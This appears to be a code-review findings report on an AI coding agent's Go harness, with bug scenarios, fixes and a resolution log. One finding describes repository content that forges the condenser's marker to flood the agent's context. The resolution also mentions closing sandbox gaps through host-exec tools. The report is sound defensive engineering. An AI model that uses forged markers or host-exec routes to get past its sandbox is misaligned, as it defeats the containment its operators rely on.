  - A repo under audit contains a file (or a build script emits output) whose first bytes are "(condensed: see context summary" followed by 200KB of payload. The agent reads it three times across the run (or reads three such files): ~150k tokens of un-compactable content accumulate, 
  - _Fix:_ Make the marker structural instead of content-sniffed: track condensed block identities per pass (e.g. a set of ToolUseIDs already condensed, carried in the sentinel block or recomputed from exact-match pointer text with
- **[medium]** ChatStream reassembly hoists all thinking blocks to the front and merges all text, destroying block order for interleaved thinking — `anthropic.go:433`
  - Native runner on claude-sonnet-4-6 (the shipped default) or claude-opus-4-8 with ThinkingBudget>0; the model interleaves: streams thinking(idx0), text(idx1), tool_use(idx2), thinking(idx3), tool_use(idx4) in one response. ChatStream reassembles as [thinking0, thinking3, text1, to
  - _Fix:_ Track stream order during assembly: record each content block (thinking/redacted_thinking, text, tool_use) with its content_block index as it completes (text blocks finalized per-index on content_block_stop instead of on
- **[medium]** Checkpoint entries precede their assistant tool_use message, so TruncateTranscriptToCheckpoint rewinds the conversation a full turn behind the restored files — `transcript.go:331`
  - Rewind tooling truncates to checkpoint seq N and restores its SHA. On resume the replayed history ends at turn T-1's tool results, so the model re-plans turn T and re-issues the same tool calls against a tree that already contains their effects: `bash: echo ... >> file` or a migr
  - _Fix:_ Record the in-flight assistant message (and per-tool tool_results) in the transcript before/with the checkpoint entry — e.g. give the checkpoint entry the tool_use ID and have truncation keep a synthesized assistant+tool
- **[medium]** RewindOnRetry restores files but not the branch: intermediate agent commits survive the rewind and pollute the next attempt's modified-file set — `workflow.go:670`
  - RewindOnRetry=true. Attempt 1's agent runs `git commit -am wip` touching files A,B,C then fails verify. Attempt 2 rewinds (HEAD still at the wip commit), fixes only file A. ModifiedFiles returns A,B,C (B,C via BaseCommit..HEAD and as working-tree-vs-index reversions); scope check
  - _Fix:_ Capture the branch HEAD SHA alongside rewindBaseline (it is the checkpoint commit's parent) and have the rewind path reset the worktree branch to it (git update-ref refs/heads/<branch> <baselineHead> or git reset --soft)
- **[medium]** A torn trailing line followed by an append-reopen produces a malformed mid-file line that permanently breaks transcript replay — `transcript.go:94`
  - r1 is OOM-killed mid-writeEntryLocked during attempt 1's execute (file ends `{"type":"mess`). The user re-runs the task; Manager.Prepare auto-recovers the same-name worktree, buildSpec computes the same transcript path, the new dispatch appends `{"type":"meta",...}` onto the torn
  - _Fix:_ In newTranscriptWriter, if the file is non-empty and its last byte is not '\n', write a '\n' before returning (self-healing the torn tail into a droppable blank/partial line), and mark the writer broken (skip further wri
- **[medium]** Per-tool shadow checkpoints capture torn files from concurrently executing sibling tools — `shadow_hook.go:66`
  - Assistant emits two parallel write_file calls (common). Tool A finishes and takes checkpoint seq N while tool B's os.WriteFile has truncated b.go but not yet written the new content. Checkpoint N's tree stores b.go as empty/partial. Any later RestoreFiles(shaN) — via ListCheckpoi
  - _Fix:_ Serialize mutating tools against the checkpoint window (take the checkpointer mutex around the tool handler for writable tools, or take checkpoints once per turn after executeTools' WaitGroup completes rather than per to
- **[low]** Compaction transcript entry written on every over-threshold turn, even when the condenser returned the history unchanged — `native_runner.go:618`
  - A long sow-native run (CompactThreshold set) whose condensed history stays over threshold: 100 remaining turns × ~400KB history = ~40MB of duplicated compaction entries in one transcript, each fsynced on the hot loop path, for zero information (each entry is identical to the prev
  - _Fix:_ Only record the rewrite when the condenser actually changed something, e.g. have the CompactFunc signal a rewrite (or compare `&out[0] != &messages[0]` / length+pointer identity) before calling tw.compaction.
- **[low]** Bash-mediated file writes never invalidate the codegraph index — graph tools serve stale results after shell edits — `tools.go:1017`
  - Model runs `bash -c "sed -i 's/OldName/NewName/g' pkg/foo.go"` then calls search_symbols("NewName") → no results (and OldName still resolves with its old location); the model concludes its rename didn't apply and re-edits, or navigates to wrong line numbers via read_file offsets.
  - _Fix:_ After a successful bash command, mark the whole index dirty (cheap: refreshLocked already rebuilds wholesale on next query) — e.g. call a coarse r.noteBashMutation() from handleBash's success path, mirroring how the shad
- **[low]** Wrapped CompactFn records a full-history transcript snapshot every over-threshold turn, even for no-op compactions — `native_runner.go:618`
  - A run crosses the threshold at turn 30 and continues to turn 100: ~70 full-history snapshots ≈ 28MB+ written and fsynced to the transcript (O(turns × history) growth), adding per-turn write latency and bloating an artifact whose message entries are otherwise deduplicated by the a
  - _Fix:_ Skip the record when nothing changed: in the wrapper, if the condenser returned the same slice (&out[0] == &messages[0] && len equal) or a deep-equal history, don't write a compaction entry.
- **[low]** Timed-out condenser calls keep running and billing in the background, invisible to budget tracking, one new goroutine per turn — `native_condense.go:297`
  - Proxy is slow (35-60s per completion) for 20 turns of an over-threshold run: 20 background goroutines pile up, each eventually completing a ~48KB-input summarization that is paid for but never surfaced on the bus — budget enforcement (CostTracker.OverBudget) lets the run continue
  - _Fix:_ Give Provider.Chat a context (or add ChatCtx) and cancel on timeout; failing that, have the abandoned goroutine emit the EventModelPostCall itself when the late response arrives, and add a singleflight guard so at most o
- **[low]** Rewind lets the failed attempt's gitignored artifacts leak into the retry, contradicting the clean-worktree contract the comment claims to preserve — `workflow.go:104`
  - Attempt 1's agent generates a gitignored artifact (dist/bundle.js, coverage output, a stale codegen cache, a .env it wrote for testing) and fails verify. Attempt 2 rewinds; the stale gitignored artifact remains and the build/tests pick it up (e.g. a stale generated file shadowing
  - _Fix:_ Diff `git ls-files --others --ignored --exclude-standard` output captured at baseline-checkpoint time against the same listing at restore time and delete ignored entries that appeared after the baseline (sparing the syml

### Unverified (verifier agents died at session limit — neither confirmed nor refuted)
13 of 31 raw findings never completed verification. They are NOT in the confirmed set above and should be re-reviewed before relying on their absence. Re-run: the review workflow's Verify phase over the raw findings.

---

## RESOLUTION (2026-07-03, polish wave — branch enhance/sota-wave2-polish)

All 12 deferred-confirmed findings AND all 13 previously-unverified findings
were fed to a 6-area polish fix wave (condenser / thinking / retrieval /
rollouts / transcript / sandbox). Each agent verified its finding's premise
against current code before fixing (folding verification into the fix — a
premise found wrong would have been skipped; none were). Every finding was
real and fixed. Highlights:

- **condenser**: summary parked at middle-window end (cache-READ billing
  restored), per-run crypto/rand nonce pins the sentinel against forgery,
  summary sanitized on re-entry, pointer self-exemption closed.
- **thinking**: ChatStream now preserves interleaved content-block order
  (added `stream.Event.BlockIndex`).
- **retrieval**: bash/env_exec writes invalidate the codegraph index;
  `--specexec-full` winner-merge refreshes the shared repomap; graph-tool
  output bounded with `... and N more` elision.
- **rollouts**: leaked rollout worktrees cleaned by name on timeout/cancel;
  `Outcome.Error` + critic file list sanitized through promptguard; runner
  models filtered by installed CLIs; blocking second-critic dissent now
  routes through the attempt/retry loop instead of killing the task.
- **transcript**: one shadow checkpoint per turn recorded after its
  messages (correct rewind target, no torn sibling files); rewind resets
  the branch not just files; torn trailing line repaired on append-reopen;
  opt-in ignored-artifact cleaning.
- **sandbox**: daemon unix sockets masked; docker runs as host uid:gid;
  Landlock `Available` self-probes helper routing; **containment
  completed** — host-exec tools (cron_create/notebook_cell_run) denied
  while the sandbox is engaged, and git works in linked worktrees
  (`WorktreeGitDirs` added to the allowlist).

Composed on `enhance/sota-wave2-polish`: full `go build/vet/test` and
`go test -race ./...` green. The residual condenser follow-up (a
ctx-aware `Provider.Chat` to cancel a timed-out summarizer goroutine) is
documented in-code as a deliberate, scoped deferral, not a silent gap.
